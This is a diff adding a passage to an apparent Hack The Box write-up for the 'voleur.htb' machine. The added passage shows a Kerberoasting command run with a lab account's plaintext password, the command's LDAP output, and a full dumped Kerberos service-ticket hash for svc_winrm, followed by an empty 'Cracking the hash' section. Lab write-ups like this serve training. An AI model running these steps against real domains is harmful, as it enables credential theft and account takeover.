@@ -266,5 +266,17 @@ faketime -f +8h bloodyAD -k --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M
 First ill update the SPN
 
 ```python
+faketime -f +8h nxc ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --kerberoasting kerb.hashes -k
+LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
+LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
+LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
+LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2025-01-29 10:07:32.711487
+LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$7c6b1136982d2aeee10a5f29630e471b$b114accdfe288b8af62aba2519337f26871ed5209bde92f50d7b8f1d32bde18ed84904fee03b78251b7f1aa64a3744cb88439bd2099f3da93f7310fc15c51489e0e0aed68ff90e3019ac06d663c10580733d956942b8e7f93502caf527d74eb2f859bf23d2ad5555212a00ea49e10ea4553dc52c90d734d42535f8970be3c8f98a50e46c433798911a951055d52fcd284db26434436b0224ac761f5db39ab474da3677a3a0f1f25a591a45e459534d8f463d1a5c7b975816842325a3811d3874b864b16769582d35f095f654e8c2cd807d6b706926d91203fc1d9fa7ee242e5bb6b145bf1589748a46c1bb70ab91d90e49cd8d0e9e364eef6f908571a1ed7eedd8628f8ac7517e08a415940e51cdcfac3ad9c8a7287a790c4c8f790586af46140d71c03092bba41d9acd9f4e407bb5e9bc4962f030a43aafc18b236d8fff6b2e9ac858b10410615f9d8938c07f89a907fc6a530df8ab04584527739f273c6ea49e98b48edebb90defa07218edf1799db5bba25ed7fbb1bb94f48bec488fdb2bac334a416582e9dbcbd69fea11b262f72f2f2ddfd16472655cf0d05d30811c924ffad99e4a3ad91e6f53c0dff880157ec8745a0a97d38af6efb869bbfe578020426d56363db536aa1cf8ba536e5e2066919f144ef281dbb2e61f725ab09d634e154363eaf72916c1b17d50df03e996684f1d746b602ab15edbe48c8365ee541d8ae31851cb2901664ab292db30a82447b94f69b7513f9bddfe1cef51cffe897ec3808a369eb3e4d426b921b9e3a4bab628871488de24512aa69d3c211f5ed46cc995d8e3939ae9c12e85ab1e5969149621512388881781aab2731bfa891c848617fa3fea2077699063df0c6eb25cb3e6ac377e35c262859d3ea026ac24da3e68dade7430d294c1b3d02cdcf2dc494516e0f8f9d4ac063de5818bc7744efcbfcce71ed5d50fb226c4da583086b02957d3389ed424704b07b4ce38f47df8f92dd664bfac740495b6162a0db7e8fe9194b868b939dc8ef44c9738531e66926eaac96634b16b53308256a226bc292aba9502ce61b29ded7f5ac74fd6dce4cd13f4110f4e791095fc387589584e3ef7155af8900085158d8772a8281e673a38c5e680bc7ba3e38242fd8c9821ecb36ea97b225cb135d0217cfbb699ad8c0d57caa0731ca8ff4c3c25f807295f429e6934284046795df03094774fb2a47bb675acbc6c0035db4372ac9182f3f604c19599e97ab75516c89063f2731a2f791ec93920e6ac34d4ac156f35ad9f219511404f845e78e864ae596c7fccdbfee2ea52e38fd9283df7963d0d983acd4fb50f8b7f14611c2e463e9e4b9dc28094196c3e1145fb81d65fe7221b48e60227a579a8ac943911c1d74576133368d6e38ff9df1b4ac38f87ff74052f27ed406f2b78f7ddf4ad2d2f697b306ac716009c6d6508141d7e3a4f058a7f1d3bb5e8847df3b5fedb63e7a78fe
+```
+Ive dumped the hash
+
+## Cracking the hash
+```python
 
 ```
